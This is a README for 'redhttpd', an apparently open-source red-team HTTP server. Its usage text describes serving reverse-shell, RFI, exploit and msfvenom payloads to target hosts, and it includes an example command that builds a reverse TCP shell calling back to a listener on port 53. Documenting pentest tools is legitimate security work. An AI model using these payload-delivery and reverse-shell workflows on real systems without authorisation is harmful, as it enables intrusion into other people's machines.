# redhttpd

Forget "python -m SimpleHTTPServer". redhttpd implements - on top of SimpleHTTPServer ;) - a set of useful features for Red Teaming and Penetration Testing. This tool was designed to run on the "tester side" and make his/her life easier in recurring tasks such as:
	
	1. getting a reverse shell in restricted environments - such as when there's only 1
	    outbound port open on the target host - with a simple target side one-liner
	2. exploiting Remote File Inclusion (RFI) vulnerabilities
	3. transferring favorite/most used exploits and exploits' suggesters for privilege escalation
	4. creating and transferring msf shellcode
	5. transferring any file to the target host.

# Usage

```
usage: redhttpd.py [-h] [-a BINDING_ADDRESS] [-p PORT] [-d ROOT_DIRECTORY]
                   (-y [{sh,py,ps1}] | -r [{php,asp,aspx}] | -x [{suggesters,linux,windows,mac}] | -m [MSF_SHELL] | -f FILES [FILES ...])
                   [-e [EXTENSION]] [-c [{wget,curl,powershell}]] [-v {0,1,2}]
                   [--LHOST LHOST] [--LPORT LPORT] [--no-netcat]

RedTeam httpd.

optional arguments:
  -h, --help            show this help message and exit
  -a BINDING_ADDRESS, --binding-address BINDING_ADDRESS
                        Local address where to bind.
  -p PORT, --port PORT  Listening port.
  -d ROOT_DIRECTORY, --root-directory ROOT_DIRECTORY
                        Root directory.
  -y [{sh,py,ps1}], --yolo [{sh,py,ps1}]
                        YOLO mode. Copy custom payloads from the corresponding 'yolo/' directory to root directory. Use it to serve one request and shutdown. Useful when chained with netcat listening on the same port. Warning: With this option on, -p/--port value will always be used even if LPORT is set. E.g.: ./redhttpd.py -p 53 -y
  -r [{php,asp,aspx}], --rfi [{php,asp,aspx}]
                        RFI mode. Copy custom RFI payload from corresponding 'rfi/' directory to root directory. Default: php. Use with -e/--extension argument to remove or change file extension.
  -x [{suggesters,linux,windows,mac}], --exploits [{suggesters,linux,windows,mac}]
                        Exploits mode. Copy custom exploits from the corresponding 'exploits/' directory to root directory. The default value is: linux.
  -m [MSF_SHELL], --msf-shell [MSF_SHELL]
                        msfvenom mode. Use msfvenom to create a shellcode and serve it. Use it just like msfvenom without LHOST, LPORT and -o parameters. E.g.: ./redhttpd.py -m " -p linux/x86/shell_reverse_tcp -f elf" --LHOST 192.168.0.1 --LPORT 53. (msfvenom required)
  -f FILES [FILES ...], --files FILES [FILES ...]
                        Custom files mode. Simply copy desired files to root directory.
  -e [EXTENSION], --extension [EXTENSION]
                        Change files extension. Only useful when used with -r/--rfi.
  -c [{wget,curl,powershell}], --clipboard [{wget,curl,powershell}]
                        Copy wget/curl/powershell + URL string to clipboard. Default: wget. (xclip required)
  -v {0,1,2}, --verbosity {0,1,2}
                        Set verbosity level.
  --LHOST LHOST         Use to substitute host placeholder.
  --LPORT LPORT         Use to substitute port placeholder.
  --no-netcat           Disables default netcat used in YOLO mode. By default, in YOLO mode, a netcat listerner starts after httpd handler is closed, on the same port redhttpd was running. (netcat required)
```

# Examples
TODO